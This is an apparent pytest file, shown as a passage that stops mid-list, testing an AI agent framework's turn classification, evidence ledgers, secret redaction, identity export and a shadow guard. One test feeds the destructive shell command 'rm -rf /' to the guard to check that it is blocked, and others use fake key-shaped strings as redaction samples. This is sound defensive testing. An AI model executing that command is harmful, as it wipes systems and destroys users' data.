"""Metabolism organs — tier, evidence, decision, map, shadow, IR, crystal, governor, verify, identity."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from remedy.core.metabolism.action_ir import start_action_ir
from remedy.core.metabolism.decision import get_decision_tracker, reset_decision_tracker
from remedy.core.metabolism.evidence import get_evidence_ledger, reset_evidence_ledger
from remedy.core.metabolism.governor import get_governor, reset_governor
from remedy.core.metabolism.identity_export import (
    build_identity_payload,
    export_identity,
    import_identity,
)
from remedy.core.metabolism.machine_map import get_machine_map, reset_machine_map
from remedy.core.metabolism.shadow import rehearse, should_shadow
from remedy.core.metabolism.tier import TurnTier, classify_turn_tier, tier_policy
from remedy.core.metabolism.time_crystal import get_time_crystal, reset_time_crystal
from remedy.core.metabolism.turn import (
    after_tool_batch,
    begin_turn_metabolism,
    end_turn_metabolism,
    metabolism_public_snapshot,
)
from remedy.core.metabolism.verify import verify_critical


@pytest.fixture(autouse=True)
def _clean_session():
    sid = "test_meta_sess"
    reset_evidence_ledger(sid)
    reset_decision_tracker(sid)
    reset_machine_map(sid)
    reset_time_crystal(sid)
    reset_governor(sid)
    yield
    reset_evidence_ledger(sid)
    reset_decision_tracker(sid)
    reset_machine_map(sid)
    reset_time_crystal(sid)
    reset_governor(sid)


def test_tier_l0_model_and_skills():
    assert classify_turn_tier("what model am I using?") == TurnTier.L0_INSTANT
    assert classify_turn_tier("list my skills") == TurnTier.L0_INSTANT
    assert classify_turn_tier("what is your version") == TurnTier.L0_INSTANT
    # Common phrasing gaps that used to fall through to L1 (frontier burn)
    assert classify_turn_tier("what model are you using?") == TurnTier.L0_INSTANT
    assert classify_turn_tier("what is the version") == TurnTier.L0_INSTANT
    assert classify_turn_tier("what's the version") == TurnTier.L0_INSTANT
    assert classify_turn_tier("what provider am I using?") == TurnTier.L0_INSTANT
    assert classify_turn_tier("show skills") == TurnTier.L0_INSTANT
    assert classify_turn_tier("/skills") == TurnTier.L0_INSTANT
    assert classify_turn_tier("/version") == TurnTier.L0_INSTANT


def test_tier_l3_autonomous_and_partition():
    assert classify_turn_tier("work alone and finish the suite") == TurnTier.L3_DEEP
    assert classify_turn_tier(
        "review auth and database modules in parallel across the codebase"
    ) == TurnTier.L3_DEEP


def test_tier_l3_work_alone_stays_l3_with_tools():
    """Gauntlet: bare 'work alone' (and peers) must stay L3 with tools on.

    Regression risk: L2 agency / L1 lean heuristics must not demote work-alone
    or strip tools — force_spread + allow_tools are L3 contracts.
    """
    work_alone_msgs = (
        "work alone",
        "work alone and finish",
        "please work alone on this",
        "finish without me",
        "don't wait for me — ship it",
        "fully autonomous until green",
        "take it from here",
        "I need to go",
        "step away for a bit, work alone",
        "handle this on your own",
    )
    for msg in work_alone_msgs:
        t = classify_turn_tier(msg, tools_enabled=True)
        assert t == TurnTier.L3_DEEP, f"{msg!r} → {t!r}"
        pol = tier_policy(t)
        assert pol.allow_tools is True, msg
        assert pol.force_spread is True, msg
        assert pol.record_ir is True, msg
    # tools_enabled=False must not demote work-alone language
    assert (
        classify_turn_tier("work alone and finish the suite", tools_enabled=False)
        == TurnTier.L3_DEEP
    )
    # Intent flag still L3 even on chat text
    assert classify_turn_tier("hello", intent="autonomous") == TurnTier.L3_DEEP


def test_tier_l2_agency():
    t = classify_turn_tier("implement file_edit for the bug in src/remedy/core/agent.py")
    assert t == TurnTier.L2_AGENCY
    pol = tier_policy(t)
    assert pol.allow_tools and pol.record_ir and pol.shadow_high_blast


def test_tier_review_project_l2_with_tools():
    """Gauntlet: review project must be L2 agency with tools (not L1 strip)."""
    t = classify_turn_tier("review project")
    assert t == TurnTier.L2_AGENCY
    assert tier_policy(t).allow_tools is True


def test_tier_l2_common_agency_phrasing():
    """Everyday tool asks must not collapse to L1 (tools stripped on hot path)."""
    agency = [
        "goto gmail",
        "open google and search weather",
        "check package.json",
        "show me the README",
        "look at the error in the logs",
        "what files are in src/",
        "run the tests",
        "ls the project root",
        "search the codebase for begin_turn",
        "create a new skill",
        "help me fix this bug",
        "package.json",
        # VCS / install / process / list / find / CUA / docs
        "git status",
        "git diff",
        "pull the latest changes",
        "commit these changes",
        "install the dependencies",
        "uv sync",
        "pip install -r requirements.txt",
        "start the server",
        "restart the api",
        "kill the process",
        "what files are here",
        "please dump the directory listing",
        "tail the log file",
        "find where authenticate is defined",
        "where is the login handler",
        "open that PR on github",
        "scroll down on the page",
        "type into the search box",
        "add a unit test for this",
        "update the changelog",
        "make sure the build works",
        "bump the version",
        # Review/audit — regressed to L1 lean (tools stripped; model prose-only)
        "review project",
        "review the project",
        "review the codebase",
        "review project and security",
        "code review",
        "audit the security",
        "security audit",
        "walk me through the project",
        # Explore / list / skill activate (L1 strip → prose "Activating skill now")
        "list files",
        "list the files",
        "inspect the project",
        "analyze the codebase",
        "look over the project",
        "scan the repo",
        "explore the project",
        "activate change-safety",
        "activate the change-safety skill",
        "skill_activate change-safety",
        "use skill change-safety",
        "load the project-etiquette skill",
        "follow the change-safety skill",
        "run the memory-backup skill",
    ]
    for msg in agency:
        t = classify_turn_tier(msg, tools_enabled=True)
        assert t >= TurnTier.L2_AGENCY, f"{msg!r} → {t!r}"
        assert tier_policy(t).allow_tools, f"{msg!r} allow_tools"
    # Browse flag alone is enough even without keyword match
    assert (
        classify_turn_tier("please open that site", browse=True) == TurnTier.L2_AGENCY
    )
    # Pure chat must stay lean (not elevated by new agency patterns)
    for chat in (
        "tell me about quantum physics",
        "explain recursion simply",
        "how are you",
        "walk me through the architecture",
        "can you summarize this conversation",
        "load balancer design tradeoffs",
    ):
        assert classify_turn_tier(chat) == TurnTier.L1_LEAN, chat


def test_tier_l1_chat():
    assert classify_turn_tier("explain how hashing works briefly") == TurnTier.L1_LEAN
    assert classify_turn_tier("thanks!") == TurnTier.L1_LEAN
    assert classify_turn_tier("hi") == TurnTier.L1_LEAN


def test_tier_early_exits_empty_and_greetings():
    """Cheap early exits: empty + greets stay L1; flags still force L2."""
    assert classify_turn_tier("") == TurnTier.L1_LEAN
    assert classify_turn_tier("   ") == TurnTier.L1_LEAN
    for g in ("hey", "thanks", "ok", "sounds good", "great"):
        assert classify_turn_tier(g) == TurnTier.L1_LEAN, g
    # Flags win over greeting text
    assert classify_turn_tier("hi", browse=True) == TurnTier.L2_AGENCY
    assert classify_turn_tier("ok", pure_action=True) == TurnTier.L2_AGENCY
    assert classify_turn_tier("yo", has_attachments=True) == TurnTier.L2_AGENCY
    # Path-less pure prose does not falsely elevate via path regex
    assert (
        classify_turn_tier(
            "Can you explain the theory of relativity in simple terms please?"
        )
        == TurnTier.L1_LEAN
    )
    # Short agency still works (ls / path)
    assert classify_turn_tier("ls") == TurnTier.L2_AGENCY
    assert classify_turn_tier("package.json") == TurnTier.L2_AGENCY


def test_tier_path_hint_gate_and_l0_before_agency():
    """Path regex only when path-ish; L0 short-circuits before L2 scans."""
    # Extension / slash elevates via path gate even without agency verbs
    assert classify_turn_tier("please open config.toml") >= TurnTier.L2_AGENCY
    assert classify_turn_tier("see src/remedy/core/agent.py") >= TurnTier.L2_AGENCY
    # No path chars → stays lean for pure explanation
    assert (
        classify_turn_tier(
            "What is the difference between hashing and encryption conceptually?"
        )
        == TurnTier.L1_LEAN
    )
    # L0 patterns still win on short single-line queries
    assert classify_turn_tier("what model am I using?") == TurnTier.L0_INSTANT
    assert classify_turn_tier("list my skills") == TurnTier.L0_INSTANT
    # Autonomous intent flag / keywords
    assert classify_turn_tier("hello", intent="autonomous") == TurnTier.L3_DEEP
    assert classify_turn_tier("please work alone on this") == TurnTier.L3_DEEP


def test_tier_l3_false_positive_edge_cases():
    """Departure/partition keywords must not over-elevate everyday chat."""
    # "go over" / "step away from" are prose — not work-alone departure
    assert (
        classify_turn_tier("I need to go over this design with you")
        == TurnTier.L1_LEAN
    )
    assert (
        classify_turn_tier("I need to go over the API docs carefully")
        == TurnTier.L1_LEAN
    )
    assert (
        classify_turn_tier("please step away from pure OOP and use composition")
        == TurnTier.L1_LEAN
    )
    # Real departure still L3
    assert classify_turn_tier("I need to go") == TurnTier.L3_DEEP
    assert classify_turn_tier("I need to go — finish without me") == TurnTier.L3_DEEP
    assert classify_turn_tier("step away for a bit, work alone") == TurnTier.L3_DEEP
    # "review all options" is chat; code targets remain deep
    assert (
        classify_turn_tier("review all options before deciding") == TurnTier.L1_LEAN
    )
    assert (
        classify_turn_tier("review all the code carefully across the modules")
        == TurnTier.L3_DEEP
    )
    # Conceptual compare stays lean; module compare is partition/deep
    assert (
        classify_turn_tier("compare hashing and encryption") == TurnTier.L1_LEAN
    )
    assert (
        classify_turn_tier("compare auth and database modules")
        == TurnTier.L3_DEEP
    )


def test_session_registry_caps_unbounded_growth():
    """Metabolism session maps must not grow without bound under churn."""
    from remedy.core.metabolism import evidence as ev_mod
    from remedy.core.metabolism.session_registry import MAX_SESSION_ENTRIES

    # Isolate global map
    with ev_mod._ledgers_lock:
        ev_mod._ledgers.clear()
    try:
        n = MAX_SESSION_ENTRIES + 20
        for i in range(n):
            get_evidence_ledger(f"cap_sess_{i}")
        with ev_mod._ledgers_lock:
            assert len(ev_mod._ledgers) <= MAX_SESSION_ENTRIES
            # Most recent keys retained
            assert f"cap_sess_{n - 1}" in ev_mod._ledgers
            assert "cap_sess_0" not in ev_mod._ledgers
    finally:
        with ev_mod._ledgers_lock:
            ev_mod._ledgers.clear()


def test_decision_tier_recorded_only_on_change():
    d = get_decision_tracker("test_meta_sess")
    assert d.record_tier_if_changed("L1_lean") is not None
    n = d.decision_units
    assert d.record_tier_if_changed("L1_lean") is None
    assert d.decision_units == n
    assert d.record_tier_if_changed("L2_agency") is not None
    assert d.decision_units == n + 1
    assert d.waste_batch_rate() == 0.0


def test_l0_preclassified_skips_reclassify():
    from remedy.core.metabolism.l0 import try_l0_system_reply

    class _R:
        _llm_provider = "openai"
        _llm_model = "gpt-test"
        config = None
        _session_id = "test_meta_sess"
        skills = None

    # Non-L0 text with preclassified=True still answers only if patterns match;
    # garbage should return None without needing re-classify success.
    assert try_l0_system_reply(_R(), "totally unrelated", preclassified=True) is None
    # Version pattern with preclassified (caller already gated)
    out = try_l0_system_reply(_R(), "what is your version", preclassified=True)
    assert out and "Remedy" in out
    # Model + "are you using" phrasing must answer locally
    out_m = try_l0_system_reply(
        _R(), "what model are you using?", preclassified=True
    )
    assert out_m and "Provider" in out_m and "gpt-test" in out_m
    out_v = try_l0_system_reply(_R(), "what is the version", preclassified=True)
    assert out_v and "Remedy" in out_v


def test_evidence_ledger_admits_paths_and_dedupes():
    led = get_evidence_ledger("test_meta_sess")
    a = led.admit_tool_result(
        tool_name="file_read",
        content="ok\npath: C:\\Users\\Administrator\\RemedyAI\\src\\remedy\\core\\agent.py\n",
        success=True,
    )
    assert a
    n = led.evidence_units
    b = led.admit_tool_result(
        tool_name="file_read",
        content="ok\npath: C:\\Users\\Administrator\\RemedyAI\\src\\remedy\\core\\agent.py\n",
        success=True,
    )
    # path dedupe — may still get tool-summary difference; units not explode
    assert led.evidence_units <= n + 2
    assert led.snapshot()["evidence_units"] >= 1


def test_evidence_units_cap_and_lean_path():
    """Unit list + path admit are bounded; lean mode keeps a tighter ledger."""
    from remedy.core.metabolism.evidence import (
        MAX_EVIDENCE_UNITS,
        MAX_EVIDENCE_UNITS_LEAN,
        MAX_PATHS_PER_ADMIT_LEAN,
    )

    reset_evidence_ledger("eu_cap")
    led = get_evidence_ledger("eu_cap")
    # Flood unique tool summaries past the hard cap
    for i in range(MAX_EVIDENCE_UNITS + 40):
        led.admit_tool_result(
            tool_name="bash_exec",
            content=f"ok exit code 0 unique-{i}\n",
            success=True,
        )
    assert len(led.units) <= MAX_EVIDENCE_UNITS
    assert len(led.seen_fps) <= MAX_EVIDENCE_UNITS * 2

    reset_evidence_ledger("eu_lean")
    lean = get_evidence_ledger("eu_lean")
    # Many path lines — lean must keep path admit tight and unit list small
    body = "\n".join(f"src/remedy/core/file_{i}.py" for i in range(40))
    admitted = lean.admit_tool_result(
        tool_name="list_dir",
        content=body,
        success=True,
        lean=True,
    )
    path_eus = [u for u in admitted if u.kind == "path"]
    assert len(path_eus) <= MAX_PATHS_PER_ADMIT_LEAN
    for i in range(MAX_EVIDENCE_UNITS_LEAN + 20):
        lean.admit_tool_result(
            tool_name="bash_exec",
            content=f"lean unique {i}\n",
            success=True,
            lean=True,
        )
    assert len(lean.units) <= MAX_EVIDENCE_UNITS_LEAN


def test_action_ir_steps_capped():
    from remedy.core.metabolism.action_ir import MAX_IR_STEPS, start_action_ir

    ir = start_action_ir(session_id="ir_cap", tier=2, brief_head="long run")
    for i in range(MAX_IR_STEPS + 30):
        ir.add_step(tool="file_read", arguments={"path": f"f{i}.py"}, result="ok")
    assert len(ir.steps) == MAX_IR_STEPS
    # Retains the most recent steps
    assert ir.steps[-1].args_redacted.get("path") == f"f{MAX_IR_STEPS + 29}.py"


def test_cua_macros_capped_at_64():
    from remedy.core.metabolism.cua_macros import (
        MAX_CUA_MACROS,
        get_cua_macros,
        reset_cua_macros,
    )

    reset_cua_macros()
    store = get_cua_macros()
    assert MAX_CUA_MACROS == 64
    for i in range(MAX_CUA_MACROS + 12):
        store.observe_chain(
            [
                {
                    "tool": "computer_navigate",
                    "args": {"url": f"https://example.com/page{i}"},
                },
                {"tool": "computer_click", "args": {"ref": f"e{i}"}},
            ],
            success=True,
        )
    assert len(store.macros) <= MAX_CUA_MACROS


def test_l0_begin_turn_skips_full_organ_snapshots():
    """L0 must not pay for full evidence/decision list copies on the hot path."""
    meta = begin_turn_metabolism(
        session_id="test_meta_sess",
        user_text="what model am I using?",
        intent="chat",
        tools_enabled=False,
    )
    assert meta["tier"] == 0
    assert meta["record_ir"] is False
    assert meta["injects"] == []
    # Lean stubs — no "recent" list payload
    assert "recent" not in (meta.get("evidence") or {})
    assert "recent" not in (meta.get("decisions") or {})


def test_begin_turn_reuses_pre_tier_no_dual_classify(monkeypatch):
    """send_policy pre_tier skips a second classify_turn_tier walk in begin_turn."""
    calls: list[str] = []
    real = classify_turn_tier

    def _counting(*a, **k):
        calls.append("classify")
        return real(*a, **k)

    monkeypatch.setattr(
        "remedy.core.metabolism.turn.classify_turn_tier", _counting
    )
    meta = begin_turn_metabolism(
        session_id="test_pre_tier_reuse",
        user_text="review project",
        intent="tool",
        tools_enabled=True,
        pre_tier=int(TurnTier.L2_AGENCY),
    )
    assert meta["tier"] == int(TurnTier.L2_AGENCY)
    assert calls == [], f"expected no re-classify, got {calls}"
    # Autonomous still re-walks (may elevate)
    calls.clear()
    meta2 = begin_turn_metabolism(
        session_id="test_pre_tier_reuse",
        user_text="work alone and finish",
        intent="autonomous",
        tools_enabled=True,
        pre_tier=int(TurnTier.L1_LEAN),
    )
    assert meta2["tier"] == int(TurnTier.L3_DEEP)
    assert len(calls) == 1


def test_begin_turn_accepts_pre_tier_without_reclassify():
    """agent_react_loop passes pre_tier from send_policy; must not TypeError.

    Regression: unexpected pre_tier kwarg was swallowed by suppress(Exception)
    around begin_turn_metabolism → tier never set → L1 strip on agency turns.
    """
    # Reuse L2 even when text alone might look lean
    meta = begin_turn_metabolism(
        session_id="test_meta_sess",
        user_text="hi",
        intent="chat",
        tools_enabled=True,
        pre_tier=int(TurnTier.L2_AGENCY),
    )
    assert meta["tier"] == int(TurnTier.L2_AGENCY)
    assert meta["policy"]["allow_tools"] is True
    # Autonomous intent still elevates past pre_tier
    meta3 = begin_turn_metabolism(
        session_id="test_meta_sess",
        user_text="hello",
        intent="autonomous",
        pre_tier=int(TurnTier.L1_LEAN),
    )
    assert meta3["tier"] == int(TurnTier.L3_DEEP)


def test_evidence_redacts_secrets():
    led = get_evidence_ledger("test_meta_sess")
    led.admit_tool_result(
        tool_name="bash_exec",
        content="api_key=sk-abcdefghijklmnopqrstuvwxyz token=bearer deadbeefdeadbeef",
        success=True,
    )
    snap = led.snapshot()
    blob = json.dumps(snap)
    assert "sk-abcdefghijklmnopqrstuvwxyz" not in blob
    assert "[redacted]" in blob or "api_key" in blob


def test_decision_waste_scoring():
    d = get_decision_tracker("test_meta_sess")
    d.record_tool_batch(new_eu=0)
    d.record_tool_batch(new_eu=2)
    s = d.snapshot()
    assert s["waste_tool_batches"] == 1
    assert s["productive_tool_batches"] == 1
    assert s["waste_batch_rate"] == 0.5


def test_machine_map_ttl_and_hint():
    m = get_machine_map("test_meta_sess")
    m.set_work_roots([r"C:\Users\Administrator\RemedyAI"])
    m.note_browser(url="https://mail.google.com", settled=True)
    hint = m.system_hint()
    assert "browser_url=" in hint
    assert "work_roots=" in hint


def test_shadow_blocks_destructive_shell():
    assert should_shadow("bash_exec", tier=2)
    r = rehearse("bash_exec", {"command": "rm -rf /"}, tier=2)
    assert r.blocked
    r2 = rehearse("bash_exec", {"command": "echo hi"}, tier=2)
    assert r2.outcome == "pass"
    assert not should_shadow("bash_exec", tier=0)


def test_shadow_blocks_path_outside_roots(tmp_path: Path):
    root = tmp_path / "proj"
    root.mkdir()
    r = rehearse(
        "file_write",
        {"path": str(tmp_path / "other" / "x.txt"), "content": "nope"},
        tier=2,
        work_roots=[str(root)],
    )
    assert r.blocked


def test_shadow_blocks_all_batch_paths(tmp_path: Path):
    root = tmp_path / "proj"
    root.mkdir()
    good = root / "a.txt"
    bad = tmp_path / "outside" / "b.txt"
    r = rehearse(
        "file_edit_batch",
        {
            "edits": [
                {"path": str(good), "old_string": "a", "new_string": "b"},
                {"path": str(bad), "old_string": "a", "new_string": "b"},
            ]
        },
        tier=2,
        work_roots=[str(root)],
    )
    assert r.blocked


def test_shadow_allows_relative_path_under_work_root(tmp_path: Path):
    root = tmp_path / "proj"
    root.mkdir()
    r = rehearse(
        "file_write",
        {"path": "notes.txt", "content": "hello"},
        tier=2,
        work_roots=[str(root)],
    )
    assert not r.blocked
    assert r.outcome == "pass"


def test_action_ir_redacts_and_persists(tmp_path: Path):
    ir = start_action_ir(session_id="test_meta_sess", tier=2, brief_head="fix bug")
    ir.add_step(
        tool="file_write",
        arguments={
            "path": "a.txt",
            "content": "password=supersecret_body_value",
            "api_key": "sk-secretvalue123456",
        },
        result="ok",
        eu_delta=1,
    )
    pub = ir.to_public()
    args = pub["steps"][0]["args"]
    # Write bodies never persisted — only path + content hash
    assert "content" not in args or args.get("content") in (None, "[omitted]")
    assert "content_sha16" in args or "path" in args
    path = ir.persist(tmp_path)
    assert path is not None and path.is_file()
    data = json.loads(path.read_text(encoding="utf-8"))
    blob = json.dumps(data)
    assert "sk-secretvalue" not in blob
    assert "supersecret_body_value" not in blob


def test_time_crystal_never_promotes_secrets():
    tc = get_time_crystal("test_meta_sess")
    assert tc.admit("api_key=sk-abcdef0123456789", horizon="session") is None
    assert tc.blocked_secret >= 1
    f = tc.admit("Prefer TypeScript for new modules", horizon="session")
    assert f is not None
    f.hits = 3
    assert tc.promote_session_to_project(min_hits=2) >= 1
    assert any(x.horizon == "project_week" for x in tc.facts)


def test_time_crystal_facts_capped_and_hot_cache_rev():
    """Fact list is bounded; hit updates invalidate hot_block cache."""
    from remedy.core.metabolism.time_crystal import MAX_CRYSTAL_FACTS

    reset_time_crystal("crystal_cap")
    tc = get_time_crystal("crystal_cap")
    assert MAX_CRYSTAL_FACTS == 128
    for i in range(MAX_CRYSTAL_FACTS + 40):
        assert tc.admit(f"session fact number {i} unique", horizon="session")
    assert len(tc.facts) <= MAX_CRYSTAL_FACTS
    # life horizon should survive trim preference
    life = tc.admit("Always prefer typed APIs for public surfaces", horizon="life")
    assert life is not None
    assert any(f.horizon == "life" for f in tc.facts)
    # hot_block must refresh when hits bump (same len/promotions alone was stale)
    a = tc.admit("Cacheable preference alpha unique", horizon="session")
    assert a is not None
    first = tc.hot_block(max_chars=800)
    a2 = tc.admit("Cacheable preference alpha unique", horizon="session")
    assert a2 is not None and a2.hits >= 2
    second = tc.hot_block(max_chars=800)
    # Both valid crystal blocks; rev must have advanced so cache key differs
    assert first.startswith("[Time Crystal]") or first == ""
    assert second.startswith("[Time Crystal]") or second == ""
    assert getattr(tc, "_rev", 0) >= 2


def test_time_crystal_trim_prefers_durable_and_newest_session():
    """Trim keeps life/project_week over old session; newest session admits survive."""
    from remedy.core.metabolism.time_crystal import MAX_CRYSTAL_FACTS

    reset_time_crystal("crystal_trim")
    tc = get_time_crystal("crystal_trim")
    # Seed durable facts first
    durable_n = 20
    for i in range(durable_n):
        assert tc.admit(f"life durable preference {i} kept", horizon="life")
    # Flood with session facts past the cap
    for i in range(MAX_CRYSTAL_FACTS + 10):
        assert tc.admit(f"ephemeral session note {i} churn", horizon="session")
    assert len(tc.facts) <= MAX_CRYSTAL_FACTS
    life_texts = {f.text for f in tc.facts if f.horizon == "life"}
    # All durable seeds that fit policy must remain (20 << 128)
    assert len(life_texts) == durable_n
    # Newest session facts (tail of flood) should still be present
    newest = f"ephemeral session note {MAX_CRYSTAL_FACTS + 9} churn"
    assert any(f.text == newest for f in tc.facts)
    # Oldest session flood head should have been dropped
    oldest = "ephemeral session note 0 churn"
    assert not any(f.text == oldest for f in tc.facts)
    # Overflow of durable alone still caps
    reset_time_crystal("crystal_life_overflow")
    tc2 = get_time_crystal("crystal_life_overflow")
    for i in range(MAX_CRYSTAL_FACTS + 25):
        assert tc2.admit(f"life overflow pin {i} unique text", horizon="life")
    assert len(tc2.facts) <= MAX_CRYSTAL_FACTS
    assert all(f.horizon == "life" for f in tc2.facts)


def test_skill_genome_phenotypes_capped():
    from remedy.core.metabolism.skill_genome import (
        MAX_PHENOTYPES,
        get_skill_genome,
        reset_skill_genome,
    )

    reset_skill_genome()
    g = get_skill_genome()
    assert MAX_PHENOTYPES == 128
    # Protect one high-value skill so prune must keep it
    for _ in range(3):
        g.record("protected-skill", ok=True)
    assert g.phenotypes["protected-skill"].protected
    for i in range(MAX_PHENOTYPES + 30):
        g.record(f"skill-churn-{i}", ok=bool(i % 3))
    assert len(g.phenotypes) <= MAX_PHENOTYPES
    assert "protected-skill" in g.phenotypes
    top = g.rank(5)
    assert isinstance(top, list)


def test_skill_genome_prune_evicts_low_score_unprotected():
    """Low-score churn drops first; multi-success protected stays under pressure."""
    from remedy.core.metabolism.skill_genome import (
        MAX_PHENOTYPES,
        get_skill_genome,
        reset_skill_genome,
    )

    reset_skill_genome()
    g = get_skill_genome()
    for _ in range(3):
        g.record("keeper-skill", ok=True)
    assert g.phenotypes["keeper-skill"].protected
    # Fill to cap with failures (low score)
    for i in range(MAX_PHENOTYPES):
        g.record(f"fail-skill-{i}", ok=False)
    assert len(g.phenotypes) <= MAX_PHENOTYPES
    assert "keeper-skill" in g.phenotypes
    # One more success skill should evict a fail-skill, not keeper
    g.record("new-ok-skill", ok=True)
    assert len(g.phenotypes) <= MAX_PHENOTYPES
    assert "keeper-skill" in g.phenotypes
    assert "new-ok-skill" in g.phenotypes


def test_governor_decisions_capped():
    from remedy.core.metabolism.governor import MAX_GOVERNOR_DECISIONS

    reset_governor("gov_cap")
    g = get_governor("gov_cap")
    assert MAX_GOVERNOR_DECISIONS == 40
    for i in range(MAX_GOVERNOR_DECISIONS + 15):
        g.observe_and_decide(
            quality={"stuck_rate": 0.01 * (i % 5), "turns": i},
            metabolism={"waste_batch_rate": 0.1 * (i % 4), "evidence_units": i},
            tier=2 + (i % 2),
        )
    assert len(g.decisions) <= MAX_GOVERNOR_DECISIONS


def test_governor_reacts_to_stuck():
    g = get_governor("test_meta_sess")
    d = g.observe_and_decide(
        quality={"stuck_rate": 0.2, "max_tool_fail_streak": 4, "turns": 5},
        metabolism={"waste_batch_rate": 0.5, "evidence_units": 0, "decision_units": 0},
        tier=2,
    )
    assert d.actions
    assert "recovery_remedy" in d.actions or "compress_earlier" in d.actions
    notes = g.system_notes()
    assert notes


def test_verify_false_green():
    r = verify_critical(
        assistant_text="All tests passed and we are done.",
        recent_tool_texts=["===== 3 failed, 2 passed in 1.2s ====="],
    )
    assert not r.ok
    assert r.silent_remedy


def test_verify_secret_risk():
    r = verify_critical(assistant_text="Here is api_key=sk-abcdefghijklmnop")
    assert not r.ok
    assert r.kind == "secret_risk"


def test_begin_and_after_tool_metabolism():
    meta = begin_turn_metabolism(
        session_id="test_meta_sess",
        user_text="implement fix in src/foo.py",
        intent="tool",
        tools_enabled=True,
    )
    assert meta["tier"] >= 2
    assert meta.get("injects") is not None
    out = after_tool_batch(
        session_id="test_meta_sess",
        tool_name="file_read",
        arguments={"path": r"C:\Users\Administrator\RemedyAI\src\foo.py"},
        content="line1\n",
        success=True,
        tier=2,
        action_ir=meta.get("action_ir"),
    )
    assert out["evidence_units"] >= 1
    end = end_turn_metabolism(
        session_id="test_meta_sess",
        action_ir=meta.get("action_ir"),
        status="done",
    )
    assert "metabolism" in end
    # end_turn uses lean snapshot (no recent lists) on the hot path
    lean_end = end["metabolism"]
    assert lean_end.get("lean") is True
    assert "recent" not in (lean_end.get("evidence") or {})
    assert "recent" not in (lean_end.get("decisions") or {})
    assert "slices" not in (lean_end.get("machine_map") or {})
    pub = metabolism_public_snapshot("test_meta_sess")
    assert "evidence" in pub and "governor" in pub
    assert pub.get("lean") is False
    assert "recent" in (pub.get("evidence") or {})


def test_metabolism_public_snapshot_lean_skips_list_thrash():
    """Lean path: counters only — no recent/slices/top ranking payloads."""
    sid = "test_meta_sess"
    get_evidence_ledger(sid).admit_tool_result(
        tool_name="file_read",
        content="path=a.py\nhello\n",
        success=True,
    )
    get_decision_tracker(sid).record_tier_if_changed("L2_agency")
    lean = metabolism_public_snapshot(sid, lean=True)
    full = metabolism_public_snapshot(sid, lean=False)
    assert lean.get("lean") is True
    assert full.get("lean") is False
    # Counters still present
    assert int((lean.get("evidence") or {}).get("evidence_units") or 0) >= 1
    assert (lean.get("decisions") or {}).get("last_tier_label") == "L2_agency"
    assert "last_actions" in (lean.get("governor") or {})
    # No list thrash on lean
    assert "recent" not in (lean.get("evidence") or {})
    assert "recent" not in (lean.get("decisions") or {})
    assert "recent" not in (lean.get("governor") or {})
    assert "slices" not in (lean.get("machine_map") or {})
    assert "recent" not in (lean.get("time_crystal") or {})
    assert "top" not in (lean.get("skill_genome") or {})
    assert "top" not in (lean.get("cua_macros") or {})
    # Full still carries recent + ranking
    assert "recent" in (full.get("evidence") or {})
    assert "recent" in (full.get("decisions") or {})


def test_partner_metabolism_snapshot_api_top_level_fields(tmp_path: Path):
    """GET /api/partner/metabolism exposes tier + EU/DU at the top level."""
    import asyncio

    from fastapi.testclient import TestClient

    from remedy.core.session_quality import get_session_quality, reset_session_quality
    from remedy.interfaces.api import create_app
    from remedy.memory.store import MemoryStore

    sid = "meta_api_sess"
    reset_session_quality(sid)
    reset_evidence_ledger(sid)
    reset_decision_tracker(sid)
    get_session_quality(sid).record_metabolism(
        tier=2, evidence_units=3, decision_units=1
    )
    get_evidence_ledger(sid).admit_tool_result(
        tool_name="file_read",
        content="path=a.py\nline1\n",
        success=True,
    )
    get_decision_tracker(sid).record_tier_if_changed("L2_agency")

    async def _init():
        store = MemoryStore(str(tmp_path / "mem.db"))
        await store.initialize()
        return store

    store = asyncio.run(_init())
    rt = type(
        "RT",
        (),
        {
            "skills": type("S", (), {"count": 0, "skills": []})(),
            "_session_id": sid,
            "_streaming_sessions": set(),
        },
    )()
    app = create_app(runtime=rt, memory=store, api_key="")
    with TestClient(app) as client:
        r = client.get(f"/api/partner/metabolism?session_id={sid}")
        assert r.status_code == 200
        data = r.json()
    assert data.get("session_id") == sid
    assert data.get("tier") == 2
    assert int(data.get("evidence_units") or 0) >= 3
    assert int(data.get("decision_units") or 0) >= 1
    assert isinstance(data.get("metabolism"), dict)
    assert "governor" in data["metabolism"] or "machine_map" in data["metabolism"]
    reset_session_quality(sid)


def test_identity_export_import_roundtrip(tmp_path: Path):
    payload = build_identity_payload(
        partner_memory=[{"text": "Prefers dark mode"}],
        time_crystal=[{"text": "Uses Windows", "horizon": "life"}],
        display_name="Ahmi",
    )
    # Ensure secrets cannot be smuggled
    payload["partner_memory"].append({"text": "api_key=sk-shouldnot", "token": "x"})
    clean = build_identity_payload(
        partner_memory=payload["partner_memory"],
        display_name="Ahmi",
    )
    path = export_identity(clean, tmp_path / "id.remedy", passphrase="test-pass-12")
    got = import_identity(path, passphrase="test-pass-12")
    assert got["display_name"] == "Ahmi"
    assert "api_keys" in (got.get("excludes") or [])
    with pytest.raises(ValueError):
        import_identity(path, passphrase="wrong-password-xx")
    # HMAC tamper detection
    raw = path.read_text(encoding="utf-8")
    path.write_text(raw.replace("Prefers", "HackedX"), encoding="utf-8")
    # ciphertext base64 may not contain that plaintext; flip a cipher byte instead
    import json as _json
    import base64

    pkg = _json.loads(path.read_text(encoding="utf-8") if "ciphertext" in raw else raw)
    # re-export clean and tamper ciphertext
    path = export_identity(clean, tmp_path / "id2.remedy", passphrase="test-pass-12")
    pkg = _json.loads(path.read_text(encoding="utf-8"))
    ct = bytearray(base64.b64decode(pkg["ciphertext_b64"]))
    ct[0] ^= 0xFF
    pkg["ciphertext_b64"] = base64.b64encode(bytes(ct)).decode("ascii")
    path.write_text(_json.dumps(pkg), encoding="utf-8")
    with pytest.raises(ValueError):
        import_identity(path, passphrase="test-pass-12")


def test_redact_shared_patterns():
    from remedy.core.metabolism.redact import redact_text, looks_like_secret_text

    assert looks_like_secret_text("api_key=sk-abcdefghijklmnopqrst")
    s = redact_text("Authorization: Bearer abcdefghijklmnop")
    assert "abcdefghijklmnop" not in s
    assert "[redacted]" in s
    # Provider-shaped keys (Anthropic / OpenRouter / Google / HF / Stripe)
    for sample in (
        "sk-ant-api03-abcdefghijklmnopqrstuvwxyz",
        "sk-or-v1-abcdefghijklmnopqrstuvwxyz",
        "AIzaSyA-abcdefghijklmnopqrstuvwx",
        "hf_abcdefghijklmnopqrstuvwxyzABCD",
